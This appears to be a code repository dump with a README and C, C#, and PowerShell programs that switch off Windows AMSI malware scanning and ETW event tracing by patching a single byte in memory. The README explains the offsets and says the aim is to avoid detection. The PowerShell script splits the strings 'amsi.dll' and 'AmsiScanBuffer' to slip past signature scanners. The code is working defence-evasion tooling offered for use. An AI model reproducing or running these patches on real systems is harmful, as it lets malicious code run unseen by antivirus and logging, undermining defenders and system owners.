Project Path: arc_gmh5225_AMSI-ETW-Patch_wmdt20d9

Source Tree:

```txt
arc_gmh5225_AMSI-ETW-Patch_wmdt20d9
├── README.md
├── amsi-flow-1.png
├── amsi-flow-2.png
├── etw-flow-1.png
├── etw-func.png
├── patch-amsi-x64-csharp.cs
├── patch-amsi-x64-powershell.ps1
├── patch-amsi-x64.c
└── patch-etw-x64.c

```

`README.md`:

```md
# AMSI-ETW-Patch
this repo contains information to patch AMSI and ETW using a single byte patch for both.

The idea was to limit detection of the patch itself since it's a single byte.

# AMSI (patch-amsi-x64.c)

The idea is that AMSI perform a lot of validation check before hitting the critical AMSI "check" code. You can simply toggle one of the `jz` for a `jnz` and vice versa.


![amsi1](https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/amsi-flow-1.png?raw=true)

The red arrow in tthe figure above is showing where the critical code is located.

![amsi2](https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/amsi-flow-2.png?raw=true)

Example of checks that can be toggled to avoid calling the critical code.

In this case we patch the `jnz` after the `cmp dword ptr [rbx], 49534d41h`.

the patch is simply Address of `AmsiScanBuffer + 0x83 = 0x74 (x64)`

# ETW (patch-etw-x64.c)

Instead of patching `EtwEventWrite` simply patch the syscall `NtTraceEvent` which is called by a lot of functions.

![etw1](https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/etw-flow-1.png?raw=true)

As shown in the figure below `NtTraceEvent` is used by a lot of functions within `ntdll.dll`


![etw1](https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/etw-func.png?raw=true)

The patch is simply force a return when the `NtTraceEvent` function is called `NtTraceEvent = 0xc3 (x64)`


```

`patch-amsi-x64-csharp.cs`:

```cs
using System;
using System.Runtime.InteropServices;
using System.Threading;


namespace AmsiPatch
{
    internal class Program
    {

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);

        static void Main(string[] args)
        {
            // offset 0x83 => 0x74
            // offset 0x95 => 0x75

            IntPtr lib = LoadLibrary("amsi.dll");
            IntPtr amsi = GetProcAddress(lib, "AmsiScanBuffer");
            IntPtr final = IntPtr.Add(amsi, 0x95);
            uint old = 0;
            
            VirtualProtect(final, (UInt32)0x1, 0x40, out old);

            Console.WriteLine(old);
            byte[] patch = new byte[] { 0x75 };
            Marshal.Copy(patch, 0, final, 1);
            
            VirtualProtect(final, (UInt32)0x1, old, out old);
        }
    }
}

```

`patch-amsi-x64-powershell.ps1`:

```ps1
$data = @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class Program
{
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
	public static void Run()
	{
		IntPtr lib = LoadLibrary("a"+"m"+"si."+"dll");
		IntPtr amsi = GetProcAddress(lib, "Am"+"s"+"iScan"+"B"+"uffer");
		IntPtr final = IntPtr.Add(amsi, 0x95);
		uint old = 0;
		VirtualProtect(final, (UInt32)0x1, 0x40, out old);

		Console.WriteLine(old);
		byte[] patch = new byte[] { 0x75 };

		Marshal.Copy(patch, 0, final, 1);

		VirtualProtect(final, (UInt32)0x1, old, out old);
	}
}
"@

Add-Type $data -Language CSharp 

[Program]::Run()

```

`patch-amsi-x64.c`:

```c
#include <windows.h>

int main() {
	DWORD dwOld = 0;
	DWORD offset = 0x83;
	FARPROC ptrAmsiScanBuffer = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");
	VirtualProtect(ptrAmsiScanBuffer + offset, 1, PAGE_EXECUTE_READWRITE, &dwOld);
	memcpy(ptrAmsiScanBuffer + offset, "\x74", 1);
	VirtualProtect(ptrAmsiScanBuffer + offset, 1, dwOld, &dwOld);
	return 0;
}

```

`patch-etw-x64.c`:

```c
#include <windows.h>

int main() {
	DWORD dwOld = 0;
	FARPROC ptrNtTraceEvent = GetProcAddress(LoadLibrary("ntdll.dll"), "NtTraceEvent");
	VirtualProtect(ptrNtTraceEvent, 1, PAGE_EXECUTE_READWRITE, &dwOld);
	memcpy(ptrNtTraceEvent, "\xc3", 1);
	VirtualProtect(ptrNtTraceEvent, 1, dwOld, &dwOld);
	return 0;
}

```